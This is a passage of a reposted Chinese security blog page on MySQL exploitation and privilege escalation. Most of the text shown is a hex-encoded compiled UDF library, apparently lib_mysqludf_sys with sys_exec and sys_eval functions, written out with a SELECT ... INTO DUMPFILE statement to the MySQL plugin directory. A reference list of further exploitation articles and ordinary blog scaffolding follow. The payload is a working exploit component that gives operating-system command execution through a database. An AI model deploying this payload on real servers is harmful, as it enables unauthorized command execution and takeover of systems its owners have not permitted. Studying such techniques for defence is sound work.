2bbe3927c7e8b92<span class="hljs-keyword">cd</span>1e7066a9c3f9bfba745bb073371974ec4345d5ecc5a62c1cc3138aff36ac68ae3b9fd4a0ac73d1c525681b320b5911feab5fbe120000000000000000000000000000000000000000000000000000000003000900a00b0000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000e0000000120000000000000000000000de01000000000000790100001200000000000000000000007700000000000000ba0000001200000000000000000000003504000000000000f5000000120000000000000000000000c2010000000000009e010000120000000000000000000000d900000000000000fb000000120000000000000000000000050000000000000016000000220000000000000000000000fe00000000000000cf000000120000000000000000000000ad00000000000000880100001200000000000000000000008000000000000000ab010000120000000000000000000000250100000000000010010000120000000000000000000000dc00000000000000c7000000120000000000000000000000c200000000000000b5000000120000000000000000000000cc02000000000000ed000000120000000000000000000000e802000000000000e70000001200000000000000000000009b00000000000000c200000012000000000000000000000028000000000000008001000012000b007a100000000000006e000000000000007500000012000b00a70d00000000000001000000000000001000000012000c00781100000000000000000000000000003f01000012000b001a100000000000002d000000000000001f01000012000900a00b0000000000000000000000000000c30100001000f1ff881720000000000000000000000000009600000012000b00ab0d00000000000001000000000000007001000012000b0066100000000000001400000000000000cf0100001000f1ff981720000000000000000000000000005600000012000b00a50d00000000000001000000000000000201000012000b002e0f0000000000002900000000000000a301000012000b00f71000000000000041000000000000003900000012000b00a40d00000000000001000000000000003201000012000b00ea0f0000000000003000000000000000bc0100001000f1ff881720000000000000000000000000006500000012000b00a60d00000000000001000000000000002501000012000b00800f0000000000006a000000000000008500000012000b00a80d00000000000003000000000000001701000012000b00570f00000000000029000000000000005501000012000b0047100000000000001f00000000000000a900000012000b00ac0d0000000000009a000000000000008f01000012000b00e8100000000000000f00000000000000d700000012000b00460e000000000000e800000000000000005f5f676d6f6e5f73746172745f5f005f66696e69005f5f6378615f66696e616c697a65005f4a765f5265676973746572436c6173736573006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974007379735f6765745f6465696e6974007379735f657865635f6465696e6974007379735f6576616c5f6465696e6974007379735f62696e6576616c5f696e6974007379735f62696e6576616c5f6465696e6974007379735f62696e6576616c00666f726b00737973636f6e66006d6d6170007374726e6370790077616974706964007379735f6576616c006d616c6c6f6300706f70656e007265616c6c6f630066676574730070636c6f7365007379735f6576616c5f696e697400737472637079007379735f657865635f696e6974007379735f7365745f696e6974007379735f6765745f696e6974006c69625f6d7973716c7564665f7379735f696e666f006c69625f6d7973716c7564665f7379735f696e666f5f696e6974007379735f657865630073797374656d007379735f73657400736574656e76007379735f7365745f6465696e69740066726565007379735f67657400676574656e76006c6962632e736f2e36005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e322e35000000000000000000020002000200020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001000100000001000100b20100001000000000000000751a690900000200d401000000000000801720000000000008000000000000008017200000000000d01620000000000006000000020000000000000000000000d81620000000000006000000030000000000000000000000e016200000000000060000000a00000000000000000000000017200000000000070000000400000000000000000000000817200000000000070000000500000000000000000000001017200000000000070000000600000000000000000000001817200000000000070000000700000000000000000000002017200000000000070000000800000000000000000000002817200000000000070000000900000000000000000000003017200000000000070000000a00000000000000000000003817200000000000070000000b00000000000000000000004017200000000000070000000c00000000000000000000004817200000000000070000000d00000000000000000000005017200000000000070000000e00000000000000000000005817200000000000070000000f00000000000000000000006017200000000000070000001000000000000000000000006817200000000000070000001100000000000000000000007017200000000000070000001200000000000000000000007817200000000000070000001300000000000000000000004883ec08e827010000e8c2010000e88d0500004883c408c3ff35320b2000ff25340b20000f1f4000ff25320b20006800000000e9e0ffffffff252a0b20006801000000e9d0ffffffff25220b20006802000000e9c0ffffffff251a0b20006803000000e9b0ffffffff25120b20006804000000e9a0ffffffff250a0b20006805000000e990ffffffff25020b20006806000000e980ffffffff25fa0a20006807000000e970ffffffff25f20a20006808000000e960ffffffff25ea0a20006809000000e950ffffffff25e20a2000680a000000e940ffffffff25da0a2000680b000000e930ffffffff25d20a2000680c000000e920ffffffff25ca0a2000680d000000e910ffffffff25c20a2000680e000000e900ffffffff25ba0a2000680f000000e9f0feffff00000000000000004883ec08488b05f50920004885c07402ffd04883c408c390909090909090909055803d900a2000004889e5415453756248833dd809200000740c488b3d6f0a2000e812ffffff488d05130820004c8d2504082000488b15650a20004c29e048c1f803488d58ff4839da73200f1f440000488d4201488905450a200041ff14c4488b153a0a20004839da72e5c605260a2000015b415cc9c3660f1f8400000000005548833dbf072000004889e57422488b05530920004885c07416488d3da70720004989c3c941ffe30f1f840000000000c9c39090c3c3c3c331c0c3c341544883c9ff4989f455534883ec10488b4610488b3831c0f2ae48f7d1488d69ffe8b6feffff83f80089c77c61754fbf1e000000e803feffff488d70ff4531c94531c031ffb921000000ba07000000488d042e48f7d64821c6e8aefeffff4883f8ff4889c37427498b4424104889ea4889df488b30e852feffffffd3eb0cba0100000031f6e802feffff31c0eb05b8010000005a595b5d415cc34157bf00040000415641554531ed415455534889f34883ec1848894c24104c89442408e85afdffffbf010000004989c6e84dfdffffc600004889c5488b4310488d356a030000488b38e814feffff4989c7eb374c89f731c04883c9fff2ae4889ef48f7d1488d59ff4d8d641d004c89e6e8ddfdffff4a8d3c284889da4c89f64d89e54889c5e8a8fdffff4c89fabe080000004c89f7e818fdffff4885c075b44c89ffe82bfdffff807d0000750a488b442408c60001eb1f42c6442dff0031c04883c9ff4889eff2ae488b44241048f7d148ffc94889084883c4184889e85b5d415c415d415e415fc34883ec08833e014889d7750b488b460831d2833800740e488d353a020000e817fdffffb20188d05ec34883ec08833e014889d7750b488b460831d2833800740e488d3511020000e8eefcffffb20188d05fc3554889fd534889d34883ec08833e027409488d3519020000eb3f488b46088338007409488d3526020000eb2dc7400400000000488b4618488b384883c70248037808e801fcffff31d24885c0488945107511488d351f0200004889dfe887fcffffb20141585b88d05dc34883ec08833e014889f94889d77510488b46088338007507c6010131c0eb0e488d3576010000e853fcffffb0014159c34154488d35ef0100004989cc4889d7534889d34883ec08e832fcffff49c704241e0000004889d8415a5b415cc34883ec0831c0833e004889d7740e488d35d5010000e807fcffffb001415bc34883ec08488b4610488b38e862fbffff5a4898c34883ec28488b46184c8b4f104989f2488b08488b46104c89cf488b004d8d4409014889c6f3a44c89c7498b4218488b0041c6040100498b4210498b5218488b4008488b4a08ba010000004889c6f3a44c89c64c89cf498b4218488b400841c6040000e867fbffff4883c4284898c3488b7f104885ff7405e912fbffffc3554889<span class="hljs-keyword">cd</span>534c89c34883ec08488b4610488b38e849fbffff4885c04889c27505c60301eb1531c04883c9ff4889d7f2ae48f7d148ffc948894d00595b4889d05dc39090909090909090554889e5534883ec08488b05c80320004883f8ff7419488d1dbb0320000f1f004883eb08ffd0488b034883f8ff75f14883c4085bc9c390904883ec08e86ffbffff4883c408c345787065637465642065786163746c79206f6e6520737472696e67207479706520706172616d657465720045787065637465642065786163746c792074776f20617267756d656e747300457870656374656420737472696e67207479706520666f72206e616d6520706172616d6574657200436f756c64206e6f7420616c6c6f63617465206d656d6f7279006c69625f6d7973716c7564665f7379732076657273696f6e20302e302e34004e6f20617267756d656e747320616c6c6f77656420287564663a206c69625f6d7973716c7564665f7379735f696e666f290000011b033b980000001200000040fbffffb400000041fbffffcc00000042fbffffe400000043fbfffffc00000044fbffff1401000047fbffff2c01000048fbffff44010000e2fbffff6c010000cafcffffa4010000f3fcffffbc0100001cfdffffd401000086fdfffff4010000b6fdffff0c020000e3fdffff2c02000002feffff4402000016feffff5c02000084feffff7402000093feffff8c0200001400000000000000017a5200017810011b0c070890010000140000001c00000084faffff01000000000000000000000014000000340000006dfaffff010000000000000000000000140000004c00000056faffff01000000000000000000000014000000640000003ffaffff010000000000000000000000140000007c00000028faffff030000000000000000000000140000009400000013faffff01000000000000000000000024000000ac000000fcf9ffff9a00000000420e108c02480e18410e20440e3083048603000000000034000000d40000006efaffffe800000000420e10470e18420e208d048e038f02450e28410e30410e38830786068c05470e50000000000000140000000c0100001efbffff2900000000440e100000000014000000240100002ffbffff2900000000440e10000000001c0000003c01000040fbffff6a00000000410e108602440e188303470e200000140000005c0100008afbffff3000000000440e10000000001c00000074010000a2fbffff2d00000000420e108c024e0e188303470e2000001400000094010000affbffff1f00000000440e100000000014000000ac010000b6fbffff1400000000440e100000000014000000c4010000b2fbffff6e00000000440e300000000014000000dc01000008fcffff0f00000000000000000000001c000000f4010000fffbffff4100000000410e108602440e188303470e2000000000000000000000ffffffffffffffff0000000000000000ffffffffffffffff000000000000000000000000000000000100000000000000b2010000000000000c00000000000000a00b0000000000000d00000000000000781100000000000004000000000000005801000000000000f5feff6f00000000a00200000000000005000000000000006807000000000000060000000000000060030000000000000a00000000000000e0010000000000000b0000000000000018000000000000000300000000000000e81620000000000002000000000000008001000000000000140000000000000007000000000000001700000000000000200a0000000000000700000000000000c0090000000000000800000000000000600000000000000009000000000000001800000000000000feffff6f00000000a009000000000000ffffff6f000000000100000000000000f0ffff6f000000004809000000000000f9ffff6f0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000401520000000000000000000000000000000000000000000ce0b000000000000de0b000000000000ee0b000000000000fe0b0000000000000e0c0000000000001e0c0000000000002e0c0000000000003e0c0000000000004e0c0000000000005e0c0000000000006e0c0000000000007e0c0000000000008e0c0000000000009e0c000000000000ae0c000000000000be0c0000000000008017200000000000004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200002e7368737472746162002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c612e64796e002e72656c612e706c74002e696e6974002e74657874002e66696e69002e726f64617461002e65685f6672616d655f686472002e65685f6672616d65002e63746f7273002e64746f7273002e6a6372002e64796e616d6963002e676f74002e676f742e706c74002e64617461002e627373002e636f6d6d656e7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000f0000000500000002000000000000005801000000000000580100000000000048010000000000000300000000000000080000000000000004000000000000000b000000f6ffff6f0200000000000000a002000000000000a002000000000000c000000000000000030000000000000008000000000000000000000000000000150000000b00000002000000000000006003000000000000600300000000000008040000000000000400000002000000080000000000000018000000000000001d00000003000000020000000000000068070000000000006807000000000000e00100000000000000000000000000000100000000000000000000000000000025000000ffffff6f020000000000000048090000000000004809000000000000560000000000000003000000000000000200000000000000020000000000000032000000feffff6f0200000000000000a009000000000000a009000000000000200000000000000004000000010000000800000000000000000000000000000041000000040000000200000000000000c009000000000000c00900000000000060000000000000000300000000000000080000000000000018000000000000004b000000040000000200000000000000200a000000000000200a0000000000008001000000000000030000000a0000000800000000000000180000000000000055000000010000000600000000000000a00b000000000000a00b000000000000180000000000000000000000000000000400000000000000000000000000000050000000010000000600000000000000b80b000000000000b80b00000000000010010000000000000000000000000000040000000000000010000000000000005b000000010000000600000000000000d00c000000000000d00c000000000000a80400000000000000000000000000001000000000000000000000000000000061000000010000000600000000000000781100000000000078110000000000000e000000000000000000000000000000040000000000000000000000000000006700000001000000320000000000000086110000000000008611000000000000dd000000000000000000000000000000010000000000000001000000000000006f000000010000000200000000000000641200000000000064120000000000009c000000000000000000000000000000040000000000000000000000000000007d000000010000000200000000000000001300000000000000130000000000001402000000000000000000000000000008000000000000000000000000000000870000000100000003000000000000001815200000000000181500000000000010000000000000000000000000000000080000000000000000000000000000008e000000010000000300000000000000281520000000000028150000000000001000000000000000000000000000000008000000000000000000000000000000950000000100000003000000000000003815200000000000381500000000000008000000000000000000000000000000080000000000000000000000000000009a000000060000000300000000000000401520000000000040150000000000009001000000000000040000000000000008000000000000001000000000000000a3000000010000000300000000000000d016200000000000d0160000000000001800000000000000000000000000000008000000000000000800000000000000a8000000010000000300000000000000e816200000000000e8160000000000009800000000000000000000000000000008000000000000000800000000000000b1000000010000000300000000000000801720000000000080170000000000000800000000000000000000000000000008000000000000000000000000000000b7000000080000000300000000000000881720000000000088170000000000001000000000000000000000000000000008000000000000000000000000000000bc000000010000000000000000000000000000000000000088170000000000009b000000000000000000000000000000010000000000000000000000000000000100000003000000000000000000000000000000000000002318000000000000c500000000000000000000000000000001000000000000000000000000000000 INTO DUMPFILE &#x27;<span class="hljs-string">/usr/lib/mysql/plugin/udf.so</span>&#x27;;<br></code></pre></td></tr></table></figure>
+
+
+<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
+<li><a target="_blank" rel="noopener" href="https://book.douban.com/subject/30179595/">《网络攻防实战研究：漏洞利用与提权》</a></li>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2719">先知 - Windows 下三种 mysql 提权剖析</a></li>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7392">先知 - mysql 数据库漏洞利用及提权方式小结</a></li>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/1122">先知 - Mysql 提权 (CVE-2016-6663、CVE-2016-6664 组合实践)</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/kclax/article/details/91515105?utm_medium=distribute.pc_relevant.none-task-blog-title-7&spm=1001.2101.3001.4242">CSDN: Coisini - Linux MySQL Udf 提权</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/sijidou/p/10522972.html">博客园：sijidou - udf 提权</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/litlife/p/9030673.html">博客园：litlife - udf 提权原理详解</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.xazlsec.com/index.php/archives/260/">信安之路：Windows 提权系列中篇</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.webshell.cc/462.html">WebShell.cc - Mysql UDF 提权</a></li>
+<li><a target="_blank" rel="noopener" href="http://next.uuzdaisuki.com/2018/07/02/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/">Leticia’s Blog - mysql 数据库提权总结</a></li>
+<li><a target="_blank" rel="noopener" href="https://developer.aliyun.com/article/667096">阿里云开发者社区 - MySQL 日志配置</a></li>
+</ul>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/" class="category-chain-item">漏洞研究</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/mysql/" class="print-no-link">#mysql</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>转载 - MySQL 漏洞利用与提权</div>
+      <div>https://sh1yan.top/2024/04/07/mysql-Raising-rights/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>shiyan</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年4月7日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/04/07/Termux-Configuration-manual/" title="转载 - Termux 高级终端安装使用配置教程">
+                        <span class="hidden-mobile">转载 - Termux 高级终端安装使用配置教程</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a  rel="nofollow noopener"><span>Copyrights &copy; 2016-2024</span></a> <i class="iconfont icon-love"></i> <a  rel="nofollow noopener"><span>shiyan</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
